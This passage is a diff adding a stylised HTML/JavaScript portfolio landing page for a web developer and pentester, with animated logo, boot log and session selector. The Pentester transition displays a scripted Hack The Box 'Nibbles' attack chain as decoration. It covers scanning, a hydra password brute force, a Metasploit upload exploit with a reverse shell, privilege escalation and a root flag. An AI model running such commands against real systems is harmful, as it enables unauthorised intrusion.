@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Zaidi Sama — Portfolio OS</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@700;900&display=swap" rel="stylesheet"/>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{width:100%;height:100%;overflow:hidden;background:#000;font-family:'Share Tech Mono',monospace;}
+
+/* ─── SCANLINES ─── */
+.scanlines{
+  position:fixed;inset:0;z-index:9999;pointer-events:none;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.1) 2px,rgba(0,0,0,0.1) 4px);
+}
+
+/* ─── PHASES ─── */
+.phase{
+  position:fixed;inset:0;
+  display:flex;align-items:center;justify-content:center;
+  opacity:0;pointer-events:none;
+  transition:opacity 0.7s ease;
+}
+.phase.active{opacity:1;pointer-events:all;}
+
+/* ═══════════════════════════════════════
+   PHASE 1 — LOGO
+═══════════════════════════════════════ */
+#phase-logo{background:#000;flex-direction:column;}
+
+.logo-outer{
+  position:relative;
+  display:flex;flex-direction:column;
+  align-items:center;justify-content:center;
+}
+
+/* Aura rings */
+.aura{
+  position:absolute;border-radius:50%;pointer-events:none;
+}
+.aura-1{
+  width:300px;height:300px;
+  border:1.5px solid rgba(0,229,200,0.25);
+  box-shadow:0 0 40px rgba(0,229,200,0.15),inset 0 0 40px rgba(0,229,200,0.08);
+  animation:auraPulse 2s ease-in-out infinite;
+}
+.aura-2{
+  width:370px;height:370px;
+  border:1px solid rgba(0,229,200,0.12);
+  box-shadow:0 0 70px rgba(0,229,200,0.1);
+  animation:auraPulse 2s ease-in-out 0.4s infinite;
+}
+.aura-3{
+  width:440px;height:440px;
+  border:1px solid rgba(255,77,141,0.08);
+  box-shadow:0 0 100px rgba(255,77,141,0.08);
+  animation:auraPulse 2s ease-in-out 0.8s infinite;
+}
+.aura-4{
+  width:520px;height:520px;
+  border:1px solid rgba(0,229,200,0.04);
+  box-shadow:0 0 140px rgba(0,229,200,0.06);
+  animation:auraPulse 2s ease-in-out 1.2s infinite;
+}
+@keyframes auraPulse{
+  0%,100%{opacity:0.4;transform:scale(1);}
+  50%{opacity:1;transform:scale(1.025);}
+}
+
+/* Arc canvas over logo */
+#arc-canvas{
+  position:absolute;top:50%;left:50%;
+  transform:translate(-50%,-50%);
+  width:520px;height:520px;
+  pointer-events:none;z-index:2;
+}
+
+/* Logo card */
+.logo-card{
+  position:relative;z-index:3;
+  width:260px;height:260px;
+  display:flex;align-items:center;justify-content:center;
+  background:radial-gradient(circle at 50% 50%,rgba(0,229,200,0.07) 0%,transparent 65%);
+}
+
+/* Glitch layers */
+.glitch-wrap{position:relative;display:inline-block;}
+.glitch-r,.glitch-b{
+  position:absolute;top:0;left:0;
+  opacity:0;pointer-events:none;
+}
+
+/* RGB glitch on .glitching */
+.glitching .main-svg{animation:rgbGlitch 0.08s steps(1) infinite;}
+.glitching .glitch-r{opacity:0.45;animation:shiftR 0.08s steps(1) infinite;}
+.glitching .glitch-b{opacity:0.45;animation:shiftB 0.08s steps(1) infinite;}
+.glitching{animation:shake 0.08s linear infinite;}
+
+@keyframes rgbGlitch{
+  0%,100%{filter:none;transform:translate(0);}
+  15%{filter:hue-rotate(90deg) brightness(2.5);transform:translate(-4px,2px);}
+  30%{filter:hue-rotate(-90deg) saturate(3);transform:translate(4px,-3px);}
+  50%{filter:brightness(0.3);transform:translate(-2px,4px);}
+  70%{filter:saturate(5) hue-rotate(180deg);transform:translate(3px,-1px);}
+  85%{filter:invert(0.2);transform:translate(-1px,3px);}
+}
+@keyframes shiftR{
+  0%,100%{transform:translate(0);clip-path:none;}
+  25%{transform:translate(-8px,1px);clip-path:polygon(0 15%,100% 15%,100% 35%,0 35%);}
+  75%{transform:translate(8px,-1px);clip-path:polygon(0 60%,100% 60%,100% 78%,0 78%);}
+}
+@keyframes shiftB{
+  0%,100%{transform:translate(0);clip-path:none;}
+  40%{transform:translate(6px,-3px);clip-path:polygon(0 40%,100% 40%,100% 58%,0 58%);}
+  80%{transform:translate(-4px,2px);clip-path:polygon(0 5%,100% 5%,100% 18%,0 18%);}
+}
+@keyframes shake{
+  0%,100%{transform:translate(0);}
+  20%{transform:translate(-3px,1px);}
+  40%{transform:translate(3px,-2px);}
+  60%{transform:translate(-2px,3px);}
+  80%{transform:translate(2px,-1px);}
+}
+
+/* SVG internal draw animations */
+.z-line{
+  stroke:#00e5c8;stroke-width:4.5;fill:none;
+  stroke-linecap:round;stroke-linejoin:round;
+  stroke-dasharray:600;stroke-dashoffset:600;
+  filter:drop-shadow(0 0 6px #00e5c8) drop-shadow(0 0 12px rgba(0,229,200,0.5));
+  animation:trace 1.8s ease-out forwards;
+}
+.z-line-accent{
+  stroke:#ff4d8d;stroke-width:2;fill:none;stroke-linecap:round;
+  stroke-dasharray:200;stroke-dashoffset:200;
+  filter:drop-shadow(0 0 4px #ff4d8d);
+  animation:trace 1.2s ease-out 0.8s forwards;
+}
+@keyframes trace{0%{stroke-dashoffset:600;}100%{stroke-dashoffset:0;}}
+.node-main{fill:#00e5c8;filter:drop-shadow(0 0 4px #00e5c8);animation:nPulse 2.4s ease-in-out infinite;}
+.node-accent{fill:#ff4d8d;filter:drop-shadow(0 0 4px #ff4d8d);animation:nPulse 2.4s ease-in-out 0.4s infinite;}
+@keyframes nPulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:0.5;transform:scale(0.8);}}
+.cur{fill:#00e5c8;animation:blink 1s step-end infinite;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(16px);}to{opacity:1;transform:translateY(0);}}
+
+.logo-name{
+  font-family:'Orbitron',monospace;font-size:34px;font-weight:900;
+  letter-spacing:14px;color:#00e5c8;
+  text-shadow:0 0 20px rgba(0,229,200,1),0 0 50px rgba(0,229,200,0.6),0 0 100px rgba(0,229,200,0.3);
+  margin-top:20px;opacity:0;
+  animation:fadeUp 0.7s ease 2s forwards;
+}
+.logo-tag{
+  font-size:11px;letter-spacing:5px;color:rgba(0,229,200,0.55);
+  margin-top:10px;opacity:0;
+  animation:fadeUp 0.7s ease 2.4s forwards;
+}
+.logo-sub{
+  display:flex;gap:18px;margin-top:14px;opacity:0;
+  animation:fadeUp 0.7s ease 2.8s forwards;
+}
+.badge{font-size:10px;letter-spacing:2px;padding:5px 16px;border:1px solid;border-radius:3px;}
+.badge-c{color:#00e5c8;border-color:rgba(0,229,200,0.5);box-shadow:0 0 12px rgba(0,229,200,0.25),inset 0 0 8px rgba(0,229,200,0.05);}
+.badge-p{color:#ff4d8d;border-color:rgba(255,77,141,0.5);box-shadow:0 0 12px rgba(255,77,141,0.25),inset 0 0 8px rgba(255,77,141,0.05);}
+
+/* ═══════════════════════════════════════
+   PHASE 2 — BOOT TEXT
+═══════════════════════════════════════ */
+#phase-boot{
+  background:#000;
+  flex-direction:column;
+  align-items:flex-start;
+  padding:50px 70px;
+}
+#boot-output{
+  font-size:13px;line-height:1.9;
+  width:100%;max-width:820px;
+  max-height:calc(100vh - 160px);
+  overflow:hidden;
+}
+.bl{display:block;opacity:0;transform:translateX(-8px);transition:opacity 0.08s,transform 0.08s;}
+.bl.on{opacity:1;transform:translateX(0);}
+.ok{color:#00ff88;}
+.warn{color:#ffaa00;}
+.info{color:#00e5c8;}
+.dim{color:rgba(0,229,200,0.35);}
+.err{color:#ff4d8d;}
+.boot-bar-wrap{margin-top:28px;width:100%;max-width:820px;}
+.boot-bar-label{font-size:10px;letter-spacing:3px;color:rgba(0,229,200,0.4);margin-bottom:8px;}
+.boot-bar-track{height:2px;background:rgba(0,229,200,0.1);border-radius:2px;overflow:hidden;}
+.boot-bar-fill{
+  height:100%;width:0%;border-radius:2px;
+  background:linear-gradient(90deg,#00e5c8,#ff4d8d);
+  box-shadow:0 0 12px rgba(0,229,200,0.9);
+  transition:width 0.12s linear;
+}
+
+/* ═══════════════════════════════════════
+   PHASE 3 — SESSION SELECT
+═══════════════════════════════════════ */
+#phase-select{background:#000;flex-direction:column;gap:70px;}
+
+.sel-header{text-align:center;}
+.sel-eyebrow{
+  font-size:10px;letter-spacing:6px;
+  color:rgba(0,229,200,0.3);text-transform:uppercase;margin-bottom:14px;
+}
+.sel-prompt{font-size:15px;letter-spacing:3px;color:rgba(0,229,200,0.65);}
+.sel-cur{
+  display:inline-block;width:9px;height:16px;
+  background:#00e5c8;vertical-align:middle;margin-left:4px;
+  animation:blink 1s step-end infinite;
+  box-shadow:0 0 8px #00e5c8;
+}
+
+.circles{display:flex;gap:120px;align-items:center;justify-content:center;}
+
+.sess{
+  position:relative;width:210px;height:210px;border-radius:50%;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  cursor:pointer;
+  transition:transform 0.4s cubic-bezier(0.34,1.56,0.64,1);
+  user-select:none;
+}
+.sess:hover{transform:scale(1.08);}
+.sess:active{transform:scale(0.96);}
+
+/* Orbit rings */
+.orb{
+  position:absolute;border-radius:50%;pointer-events:none;
+  opacity:0;transition:opacity 0.3s ease;
+}
+.sess:hover .orb{opacity:1;}
+.orb-1{width:250px;height:250px;border:1px dashed rgba(255,255,255,0.12);animation:spin 10s linear infinite;}
+.orb-2{width:285px;height:285px;border:1px dashed rgba(255,255,255,0.06);animation:spin 15s linear infinite reverse;}
+@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+
+/* Crackle canvas per circle */
+.crack-cv{
+  position:absolute;top:50%;left:50%;
+  transform:translate(-50%,-50%);
+  width:320px;height:320px;
+  pointer-events:none;opacity:0;
+  transition:opacity 0.15s;
+}
+.sess:hover .crack-cv{opacity:1;}
+
+/* ── Web Dev — warm ── */
+.s-dev{
+  border:2px solid rgba(255,140,0,0.4);
+  background:radial-gradient(circle at center,rgba(255,100,0,0.1) 0%,transparent 70%);
+  box-shadow:0 0 35px rgba(255,100,0,0.12),inset 0 0 35px rgba(255,140,0,0.06);
+}
+.s-dev:hover{
+  border-color:rgba(255,160,40,0.95);
+  box-shadow:0 0 80px rgba(255,100,0,0.55),0 0 160px rgba(255,60,0,0.2),inset 0 0 50px rgba(255,100,0,0.12);
+}
+/* ── Pentester — cold ── */
+.s-sec{
+  border:2px solid rgba(0,229,200,0.25);
+  background:radial-gradient(circle at center,rgba(0,80,220,0.1) 0%,transparent 70%);
+  box-shadow:0 0 35px rgba(0,229,200,0.08),inset 0 0 35px rgba(0,80,220,0.06);
+}
+.s-sec:hover{
+  border-color:rgba(0,229,200,0.95);
+  box-shadow:0 0 80px rgba(0,229,200,0.45),0 0 160px rgba(0,80,200,0.2),inset 0 0 50px rgba(0,229,200,0.08);
+}
+
+.c-icon{font-size:38px;margin-bottom:10px;filter:drop-shadow(0 0 8px currentColor);}
+.c-label{font-family:'Orbitron',monospace;font-size:13px;font-weight:700;letter-spacing:4px;}
+.c-sub{font-size:9px;letter-spacing:2px;margin-top:7px;opacity:0.45;}
+.s-dev .c-label{color:#ffaa44;text-shadow:0 0 12px rgba(255,150,0,0.8);}
+.s-dev .c-sub{color:rgba(255,160,50,0.7);}
+.s-sec .c-label{color:#00e5c8;text-shadow:0 0 12px rgba(0,229,200,0.8);}
+.s-sec .c-sub{color:rgba(0,229,200,0.6);}
+
+/* ─── TRANSITION OVERLAYS ─── */
+#t-warm{
+  position:fixed;inset:0;z-index:800;pointer-events:none;opacity:0;
+  background:radial-gradient(circle at center,#fffdf0 0%,#ffcc66 25%,#ff8800 55%,#cc3300 80%,#000 100%);
+}
+#t-cold{
+  position:fixed;inset:0;z-index:800;pointer-events:none;opacity:0;
+  background:#000;
+}
+#cmd-flood{
+  position:fixed;inset:0;z-index:900;
+  background:#000;padding:28px 44px;
+  font-size:12.5px;line-height:1.7;
+  overflow:hidden;opacity:0;pointer-events:none;
+}
+
+/* ─── DESTINATION STUBS ─── */
+#d-dev{
+  position:fixed;inset:0;z-index:700;opacity:0;pointer-events:none;
+  background:linear-gradient(135deg,#e8f4e8 0%,#d4edda 30%,#f0f4ff 60%,#faf0ff 100%);
+  display:flex;align-items:center;justify-content:center;
+  font-family:'Orbitron',monospace;font-size:18px;letter-spacing:4px;color:#4a7a4a;
+  flex-direction:column;gap:12px;
+}
+#d-dev span{font-family:'Share Tech Mono',monospace;font-size:12px;letter-spacing:2px;color:#7aa87a;}
+
+#d-kali{
+  position:fixed;inset:0;z-index:700;opacity:0;pointer-events:none;
+  background:#0a0a12;
+  display:flex;align-items:center;justify-content:center;
+  flex-direction:column;gap:8px;
+  font-family:'Share Tech Mono',monospace;
+}
+#d-kali .k-prompt{font-size:15px;color:#00e5c8;}
+#d-kali .k-sub{font-size:11px;letter-spacing:3px;color:rgba(0,229,200,0.35);}
+</style>
+</head>
+<body>
+
+<div class="scanlines"></div>
+
+<!-- SVG glitch filters -->
+<svg width="0" height="0" style="position:absolute;pointer-events:none;">
+  <defs>
+    <filter id="fr">
+      <feColorMatrix type="matrix" values="1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0"/>
+    </filter>
+    <filter id="fb">
+      <feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 1 0"/>
+    </filter>
+  </defs>
+</svg>
+
+<!-- ═════════ PHASE 1 ═════════ -->
+<div id="phase-logo" class="phase active">
+  <div class="logo-outer">
+    <!-- Aura rings -->
+    <div class="aura aura-4"></div>
+    <div class="aura aura-3"></div>
+    <div class="aura aura-2"></div>
+    <div class="aura aura-1"></div>
+
+    <!-- Electric arc canvas -->
+    <canvas id="arc-canvas" width="520" height="520"></canvas>
+
+    <!-- Logo card -->
+    <div class="logo-card">
+      <div class="glitch-wrap" id="glitch-wrap">
+
+        <!-- Main SVG -->
+        <svg class="main-svg" width="240" height="240" viewBox="0 0 220 220" xmlns="http://www.w3.org/2000/svg">
+          <path d="M110 20 L175 50 L175 120 Q175 170 110 200 Q45 170 45 120 L45 50 Z"
+                fill="none" stroke="rgba(0,229,200,0.12)" stroke-width="1.5"/>
+          <line class="z-line" x1="65" y1="68" x2="155" y2="68" style="animation-delay:0s"/>
+          <line class="z-line" x1="155" y1="68" x2="65" y2="152" style="animation-delay:0.35s"/>
+          <line class="z-line" x1="65" y1="152" x2="155" y2="152" style="animation-delay:0.7s"/>
+          <line class="z-line-accent" x1="110" y1="62" x2="110" y2="74"/>
+          <line class="z-line-accent" x1="110" y1="146" x2="110" y2="158" style="animation-delay:1.1s"/>
+          <line class="z-line-accent" x1="130" y1="90" x2="143" y2="78" style="animation-delay:1.25s"/>
+          <line class="z-line-accent" x1="90" y1="130" x2="77" y2="142" style="animation-delay:1.35s"/>
+          <circle class="node-main" cx="65" cy="68" r="5.5"/>
+          <circle class="node-main" cx="155" cy="68" r="5.5" style="animation-delay:0.35s"/>
+          <circle class="node-main" cx="65" cy="152" r="5.5" style="animation-delay:0.7s"/>
+          <circle class="node-main" cx="155" cy="152" r="5.5" style="animation-delay:0.7s"/>
+          <circle class="node-accent" cx="110" cy="68" r="4"/>
+          <circle class="node-accent" cx="110" cy="152" r="4" style="animation-delay:0.6s"/>
+          <circle class="node-accent" cx="110" cy="110" r="3" style="animation-delay:0.45s"/>
+          <circle fill="#ff4d8d" cx="143" cy="78" r="3" opacity="0.8" filter="url(#glow-p)"/>
+          <circle fill="#ff4d8d" cx="77" cy="142" r="3" opacity="0.8"/>
+          <rect class="cur" x="158" y="155" width="10" height="14" rx="1"/>
+          <text x="34" y="80" fill="rgba(0,229,200,0.4)" font-size="13" font-family="'Share Tech Mono',monospace">&lt;</text>
+          <text x="168" y="80" fill="rgba(0,229,200,0.4)" font-size="13" font-family="'Share Tech Mono',monospace">/&gt;</text>
+          <text x="36" y="166" fill="rgba(255,77,141,0.4)" font-size="11" font-family="'Share Tech Mono',monospace">[ ]</text>
+        </svg>
+
+        <!-- Red glitch layer -->
+        <svg class="glitch-r" width="240" height="240" viewBox="0 0 220 220" style="filter:url(#fr)">
+          <line stroke="#ff0000" stroke-width="5" fill="none" stroke-linecap="round" stroke-linejoin="round" x1="65" y1="68" x2="155" y2="68"/>
+          <line stroke="#ff0000" stroke-width="5" fill="none" stroke-linecap="round" stroke-linejoin="round" x1="155" y1="68" x2="65" y2="152"/>
+          <line stroke="#ff0000" stroke-width="5" fill="none" stroke-linecap="round" stroke-linejoin="round" x1="65" y1="152" x2="155" y2="152"/>
+        </svg>
+
+        <!-- Blue glitch layer -->
+        <svg class="glitch-b" width="240" height="240" viewBox="0 0 220 220" style="filter:url(#fb)">
+          <line stroke="#0066ff" stroke-width="5" fill="none" stroke-linecap="round" stroke-linejoin="round" x1="65" y1="68" x2="155" y2="68"/>
+          <line stroke="#0066ff" stroke-width="5" fill="none" stroke-linecap="round" stroke-linejoin="round" x1="155" y1="68" x2="65" y2="152"/>
+          <line stroke="#0066ff" stroke-width="5" fill="none" stroke-linecap="round" stroke-linejoin="round" x1="65" y1="152" x2="155" y2="152"/>
+        </svg>
+
+      </div>
+    </div>
+
+    <div class="logo-name">ZAIDI</div>
+    <div class="logo-tag">S Y E D &nbsp;&nbsp; T U R A B &nbsp;&nbsp; H A I D E R</div>
+    <div class="logo-sub">
+      <span class="badge badge-c">&lt; DEV /&gt;</span>
+      <span class="badge badge-p">[ SEC ]</span>
+    </div>
+  </div>
+</div>
+
+<!-- ═════════ PHASE 2 ═════════ -->
+<div id="phase-boot" class="phase">
+  <div id="boot-output"></div>
+  <div class="boot-bar-wrap">
+    <div class="boot-bar-label">PORTFOLIO OS v2.0 — LOADING</div>
+    <div class="boot-bar-track"><div class="boot-bar-fill" id="bar"></div></div>
+  </div>
+</div>
+
+<!-- ═════════ PHASE 3 ═════════ -->
+<div id="phase-select" class="phase">
+  <div class="sel-header">
+    <div class="sel-eyebrow">Portfolio OS &mdash; Session Manager</div>
+    <div class="sel-prompt">Select your session<span class="sel-cur"></span></div>
+  </div>
+
+  <div class="circles">
+    <!-- Web Dev -->
+    <div class="sess s-dev" id="btn-dev" onclick="selectSession('dev')">
+      <a href="mint-desktop.html" aria-label="Open Mint Desktop"></a>
+      <div class="orb orb-1"></div>
+      <div class="orb orb-2"></div>
+      <canvas class="crack-cv" id="cv-dev" width="320" height="320"></canvas>
+      <div class="c-icon" style="color:#ffaa44;">⚡</div>
+      <div class="c-label">Web Dev</div>
+      <div class="c-sub">MERN · REACT · NODE.JS</div>
+    </div>
+
+    <!-- Pentester -->
+    <div class="sess s-sec" id="btn-sec" onclick="selectSession('hack')">
+      <div class="orb orb-1"></div>
+      <div class="orb orb-2"></div>
+      <canvas class="crack-cv" id="cv-sec" width="320" height="320"></canvas>
+      <div class="c-icon" style="color:#00e5c8;">💀</div>
+      <div class="c-label">Pentester</div>
+      <div class="c-sub">HTB · OSINT · KALI</div>
+      <a href="desktop-kali.html" aria-label="Open Kali Desktop"></a>
+    </div>
+  </div>
+
+</div>
+
+<!-- Transitions -->
+<div id="t-warm"></div>
+<div id="t-cold"></div>
+<div id="cmd-flood"></div>
+
+<!-- Destination stubs (replaced with full desktops in next stages) -->
+<div id="d-dev">
+  🌿 WEB DEV DESKTOP
+  <span>Loading Mint environment...</span>
+</div>
+<div id="d-kali">
+  <div class="k-prompt">root@zaidi:~# _</div>
+  <div class="k-sub">Loading Kali environment...</div>
+</div>
+
+<script>
+/* ════════════════════════════════════════════
+   LIGHTNING ENGINE
+════════════════════════════════════════════ */
+function bolt(ctx, x1, y1, x2, y2, rough, depth) {
+  if (depth === 0) { ctx.moveTo(x1,y1); ctx.lineTo(x2,y2); return; }
+  const mx = (x1+x2)/2 + (Math.random()-0.5)*rough;
+  const my = (y1+y2)/2 + (Math.random()-0.5)*rough;
+  bolt(ctx,x1,y1,mx,my,rough/2,depth-1);
+  bolt(ctx,mx,my,x2,y2,rough/2,depth-1);
+}
+
+function drawArcs(canvas, cx, cy, color, count, radius) {
+  const ctx = canvas.getContext('2d');
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  ctx.shadowBlur = 10; ctx.shadowColor = color;
+  for (let i=0; i<count; i++) {
+    const a = Math.random()*Math.PI*2;
+    const spread = radius + Math.random()*50;
+    const ex = cx + Math.cos(a)*spread;
+    const ey = cy + Math.sin(a)*spread;
+    const sa = a + (Math.random()-0.5)*0.9;
+    const sx = cx + Math.cos(sa)*(radius-35);
+    const sy = cy + Math.sin(sa)*(radius-35);
+    ctx.beginPath();
+    ctx.strokeStyle = color;
+    ctx.lineWidth = Math.random()<0.25 ? 2.5 : 1;
+    ctx.globalAlpha = 0.25 + Math.random()*0.75;
+    bolt(ctx,sx,sy,ex,ey,30,4);
+    ctx.stroke();
+  }
+  ctx.globalAlpha = 1; ctx.shadowBlur = 0;
+}
+
+/* ════════════════════════════════════════════
+   LOGO ARC DRIVER
+════════════════════════════════════════════ */
+const arcCv = document.getElementById('arc-canvas');
+let arcOn = false, arcTimer;
+
+function startLogoArcs() {
+  arcOn = true;
+  arcTimer = setInterval(()=>{
+    if (!arcOn) return;
+    drawArcs(arcCv, 260, 260, '#00e5c8', 5, 130);
+    setTimeout(()=>{
+      const ctx = arcCv.getContext('2d');
+      ctx.clearRect(0,0,520,520);
+    }, 90);
+  }, 180);
+}
+
+/* ════════════════════════════════════════════
+   PHASE SWITCHER
+════════════════════════════════════════════ */
+function goPhase(id) {
+  document.querySelectorAll('.phase').forEach(p=>{
+    p.classList.remove('active');
+    p.style.opacity='0';
+    p.style.pointerEvents='none';
+  });
+  const el = document.getElementById(id);
+  el.style.transition='none';
+  el.style.opacity='0';
+  el.classList.add('active');
+  el.style.pointerEvents='all';
+  requestAnimationFrame(()=>{
+    el.style.transition='opacity 0.7s ease';
+    el.style.opacity='1';
+  });
+}
+
+/* ════════════════════════════════════════════
+   BOOT TEXT DATA
+════════════════════════════════════════════ */
+const BOOT = [
+  {t:'[    0.000000] Booting Portfolio OS v2.0 ...', c:'info'},
+  {t:'[    0.008812] CPU0: Zaidi Sama — Full-Stack + Penetration Tester', c:''},
+  {t:'[    0.017204] BIOS-e820: [mem 0x00000000-0x0009ffff] usable', c:'dim'},
+  {t:'[    0.024561] Initializing kernel modules...', c:'dim'},
+  {t:'[    0.031903] [  OK  ] module: react@18.3 loaded', c:'ok'},
+  {t:'[    0.039244] [  OK  ] module: next@15.0 loaded', c:'ok'},
+  {t:'[    0.046582] [  OK  ] module: express@4.18 loaded', c:'ok'},
+  {t:'[    0.053991] [  OK  ] module: mongoose@8.0 loaded', c:'ok'},
+  {t:'[    0.061340] [  OK  ] module: nmap@7.94 loaded', c:'ok'},
+  {t:'[    0.068778] [  OK  ] module: metasploit-framework loaded', c:'ok'},
+  {t:'[    0.076115] [  OK  ] module: burpsuite-pro loaded', c:'ok'},
+  {t:'[    0.083462] [  OK  ] module: gobuster@3.6 loaded', c:'ok'},
+  {t:'[    0.090801] Mounting data filesystems...', c:'dim'},
+  {t:'[    0.098140] [  OK  ] Mounted /portfolio/projects', c:'ok'},
+  {t:'[    0.105479] [  OK  ] Mounted /portfolio/skills', c:'ok'},
+  {t:'[    0.112818] [  OK  ] Mounted /portfolio/ctf-writeups', c:'ok'},
+  {t:'[    0.120157] [  OK  ] Mounted /portfolio/certifications', c:'ok'},
+  {t:'[    0.127496] Starting network services...', c:'dim'},
+  {t:'[    0.134835] [  OK  ] Started portfolio-api.service', c:'ok'},
+  {t:'[    0.142174] [  OK  ] Connected to MongoDB Atlas', c:'ok'},
+  {t:'[    0.149513] [  OK  ] HTB VPN tunnel established (tun0)', c:'ok'},
+  {t:'[    0.156852] [WARN  ] HTB rank data: refreshing...', c:'warn'},
+  {t:'[    0.164191] [  OK  ] HTB session data synced', c:'ok'},
+  {t:'[    0.171530] Starting session-manager.service...', c:'dim'},
+  {t:'[    0.178869] [  OK  ] Session manager online', c:'ok'},
+  {t:'[    0.186208] All systems nominal. Welcome, visitor.', c:'info'},
+];
+
+function runBoot() {
+  const out = document.getElementById('boot-output');
+  const bar = document.getElementById('bar');
+  out.innerHTML = '';
+  let i = 0;
+  const total = BOOT.length;
+  function next() {
+    if (i >= total) {
+      bar.style.width = '100%';
+      setTimeout(()=>goPhase('phase-select'), 700);
+      return;
+    }
+    const d = BOOT[i];
+    const s = document.createElement('span');
+    s.className = 'bl ' + d.c;
+    s.textContent = d.t;
+    out.appendChild(s);
+    requestAnimationFrame(()=>s.classList.add('on'));
+    bar.style.width = Math.round((i/total)*100)+'%';
+    i++;
+    setTimeout(next, 75 + Math.random()*55);
+  }
+  next();
+}
+
+/* ════════════════════════════════════════════
+   CIRCLE HOVER CRACKLE
+════════════════════════════════════════════ */
+let devCrack, secCrack;
+
+document.getElementById('btn-dev').addEventListener('mouseenter', ()=>{
+  devCrack = setInterval(()=>{
+    drawArcs(document.getElementById('cv-dev'), 160, 160, '#ff8800', 6, 105);
+    setTimeout(()=>{
+      document.getElementById('cv-dev').getContext('2d').clearRect(0,0,320,320);
+    },55);
+  }, 90);
+});
+document.getElementById('btn-dev').addEventListener('mouseleave', ()=>{
+  clearInterval(devCrack);
+  document.getElementById('cv-dev').getContext('2d').clearRect(0,0,320,320);
+});
+
+document.getElementById('btn-sec').addEventListener('mouseenter', ()=>{
+  secCrack = setInterval(()=>{
+    drawArcs(document.getElementById('cv-sec'), 160, 160, '#00e5c8', 6, 105);
+    setTimeout(()=>{
+      document.getElementById('cv-sec').getContext('2d').clearRect(0,0,320,320);
+    },55);
+  }, 90);
+});
+document.getElementById('btn-sec').addEventListener('mouseleave', ()=>{
+  clearInterval(secCrack);
+  document.getElementById('cv-sec').getContext('2d').clearRect(0,0,320,320);
+});
+
+/* ════════════════════════════════════════════
+   SESSION SELECT
+════════════════════════════════════════════ */
+const CMD_FLOOD = [
+  'root@zaidi:~# nmap -sS -sV -A -p- --min-rate=5000 10.129.0.0/16',
+  '[*] Nmap 7.94 — Starting aggressive scan...',
+  'Discovered open port 22/tcp on 10.129.1.15',
+  'Discovered open port 80/tcp on 10.129.1.15',
+  'Discovered open port 8080/tcp on 10.129.1.15',
+  'root@zaidi:~# gobuster dir -u http://10.129.1.15 -w /usr/share/wordlists/dirb/big.txt -t 50',
+  '===============================================================',
+  '/admin                (Status: 200) [Size: 4096]',
+  '/uploads              (Status: 301) [→ /uploads/]',
+  '/nibbleblog           (Status: 200) [Size: 2987]',
+  '[+] Found: /nibbleblog/admin.php',
+  'root@zaidi:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form',
+  '[DATA] attacking http://10.129.1.15/nibbleblog/admin.php',
+  '[80][http-post-form] host: 10.129.1.15  login: admin  password: nibbles',
+  '[+] VALID CREDENTIALS FOUND',
+  'root@zaidi:~# msfconsole -q',
+  'msf6 > use exploit/multi/http/nibbleblog_file_upload',
+  'msf6 exploit > set RHOSTS 10.129.1.15',
+  'msf6 exploit > set USERNAME admin',
+  'msf6 exploit > set PASSWORD nibbles',
+  'msf6 exploit > set LHOST 10.10.14.23',
+  'msf6 exploit > run',
+  '[*] Started reverse TCP handler on 10.10.14.23:4444',
+  '[*] Uploading payload...',
+  '[*] Executing payload...',
+  '[*] Sending stage (39927 bytes) to 10.129.1.15',
+  '[+] Meterpreter session 1 opened',
+  'meterpreter > getuid',
+  'Server username: nibbler',
+  'meterpreter > shell',
+  'nibbler@Nibbles:/$ sudo -l',
+  'User nibbler may run: /home/nibbler/personal/stuff/monitor.sh',
+  'nibbler@Nibbles:/$ sudo /home/nibbler/personal/stuff/monitor.sh',
+  '[+] Privilege escalation successful',
+  'root@Nibbles:/# cat /root/root.txt',
+  '[+] FLAG: de5e5d6619862a8aa5b9b212314e0cdd',
+  '',
+  '# ╔══════════════════════════════════════════╗',
+  '# ║  SESSION AUTHENTICATED — LOADING ENV...  ║',
+  '# ╚══════════════════════════════════════════╝',
+];
+
+function selectSession(type) {
+  clearInterval(devCrack); clearInterval(secCrack);
+  document.getElementById('cv-dev').getContext('2d').clearRect(0,0,320,320);
+  document.getElementById('cv-sec').getContext('2d').clearRect(0,0,320,320);
+
+  if (type === 'dev') {
+    /* ── Warm burst ── */
+    const tw = document.getElementById('t-warm');
+    tw.style.transition = 'opacity 0.25s ease';
+    tw.style.opacity = '1'; tw.style.pointerEvents='all';
+    setTimeout(()=>{
+      tw.style.transition = 'opacity 1.1s ease';
+      tw.style.opacity = '0';
+      const dd = document.getElementById('d-dev');
+      dd.style.transition = 'opacity 0.9s ease 0.6s';
+      dd.style.opacity = '1'; dd.style.pointerEvents='all';
+      setTimeout(()=>{ window.location.href = 'mint-desktop.html'; }, 900);
+    }, 350);
+  } else {
+    /* ── Cold command flood ── */
+    const flood = document.getElementById('cmd-flood');
+    flood.style.transition = 'opacity 0.15s ease';
+    flood.style.opacity = '1'; flood.style.pointerEvents='all';
+    flood.innerHTML = '';
+    let ci = 0;
+    function nextCmd() {
+      if (ci >= CMD_FLOOD.length) {
+        setTimeout(()=>{
+          flood.style.transition='opacity 0.4s ease';
+          flood.style.opacity='0';
+          const dk = document.getElementById('d-kali');
+          dk.style.transition='opacity 0.6s ease 0.4s';
+          dk.style.opacity='1'; dk.style.pointerEvents='all';
+          setTimeout(()=>{ window.location.href = 'desktop-kali.html'; }, 900);
+        }, 400);
+        return;
+      }
+      const line = CMD_FLOOD[ci];
+      const el = document.createElement('div');
+      el.textContent = line;
+      el.style.color =
+        line.startsWith('[+]') ? '#00ff88' :
+        line.startsWith('[*]') ? '#00e5c8' :
+        line.startsWith('msf6') || line.startsWith('meterpreter') ? '#ff4d8d' :
+        line.startsWith('root@') || line.startsWith('nibbler@') ? '#ffaa44' :
+        line.startsWith('#') ? 'rgba(0,229,200,0.5)' :
